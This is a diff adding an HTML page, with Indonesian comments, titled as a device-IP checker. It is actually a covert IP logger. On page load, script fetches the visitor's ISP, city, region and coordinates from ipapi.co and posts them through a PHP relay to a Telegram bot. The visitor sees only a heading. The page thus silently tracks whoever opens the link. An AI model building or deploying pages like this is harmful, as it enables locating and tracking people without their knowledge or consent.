@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cek IP Perangkat</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script>
+    // Fungsi untuk mengirim permintaan POST ke file PHP yang akan mengirim pesan ke bot Telegram
+    function sendTelegramMessage(message) {
+      // Kirim permintaan POST ke file PHP yang akan mengirim pesan ke bot Telegram
+      $.post('telegram_send.php', { message: message }, function(response) {
+        console.log('Pesan berhasil dikirim ke Telegram');
+      }).fail(function(error) {
+        console.error('Terjadi kesalahan saat mengirim pesan ke Telegram:', error);
+      });
+    }
+
+    // Fungsi untuk mendapatkan informasi IP perangkat
+    function getDeviceInfo() {
+      // Ambil informasi IP perangkat menggunakan API ip-api.com
+      $.get('https://ipapi.co/json/', function(response) {
+        // Ambil nilai-nilai yang diperlukan dari respons API
+        var isp = response.org;
+        var country = response.country_name;
+        var region = response.region;
+        var city = response.city;
+        var coordinates = response.latitude + ', ' + response.longitude;
+        var localTime = new Date().toLocaleString();
+        var domain = response.hostname;
+        var netSpeed = response.connection;
+        var mobileCarrier = response.org;
+
+        // Format pesan yang akan dikirim ke bot Telegram
+        var message = `
+          ISP: ${isp}
+          Country: ${country}
+          Region: ${region}
+          City: ${city}
+          Coordinates of City: ${coordinates}
+          Local Time: ${localTime}
+          Domain: ${domain}
+          Net Speed: ${netSpeed}
+          Mobile Carrier: ${mobileCarrier}
+        `;
+
+        // Kirim pesan ke bot Telegram melalui PHP
+        sendTelegramMessage(message);
+      });
+    }
+
+    // Panggil fungsi getDeviceInfo saat halaman selesai dimuat
+    $(document).ready(function() {
+      getDeviceInfo();
+    });
+  </script>
+</head>
+<body>
+  <h1>Cek IP Perangkat</h1>
+</body>
+</html>
